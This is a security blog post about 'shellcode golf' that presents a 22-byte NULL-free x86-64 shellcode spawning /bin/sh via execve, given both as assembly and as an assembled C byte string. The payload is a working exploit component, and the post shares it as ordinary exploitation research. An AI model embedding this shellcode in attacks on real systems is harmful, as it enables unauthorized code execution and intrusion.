---
layout: post
title: "Even shorter x86-64 shellcode"
category: Security
date: 2016-04-27
tags:
  - Security
  - Shellcode
  - Exploitation
---

So about two years ago, I put together the [shortest x86-64 shellcode for
`execve("/bin/sh",...);`](/2014/06/05/minimal-x86-64-shellcode-for-binsh/) that I could.  At the time, it was 25 bytes, which I
thought was pretty damn good.  However, I'm a perfectionist and so I spent some
time before work this morning playing shellcode golf.  The rules of my shellcode
golf are pretty simple:

* The shellcode must produce the desired effect.
* It doesn't have to do things cleanly (i.e., segfaulting after is OK, as is
  using APIs in unusual ways, so long as it works)
* It can assume the stack pointer is at a place where it will not segfault and
  it will not overwrite the shellcode itself.
* No NULLs.  While there might be other constraints, this one is too common to
  not have as a default.

So, spending a little bit of time on this, I came up with the following 22 byte
shellcode:

~~~
BITS 64

xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
imul esi
mov al, 0x3b
syscall
~~~

Assembled, we get:

~~~
char shellcode[] = "\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05";
~~~

This is shorter than anything I could find on shell-storm or other shellcode
repositories.  If you know of something shorter or think you can do better, let
me know!
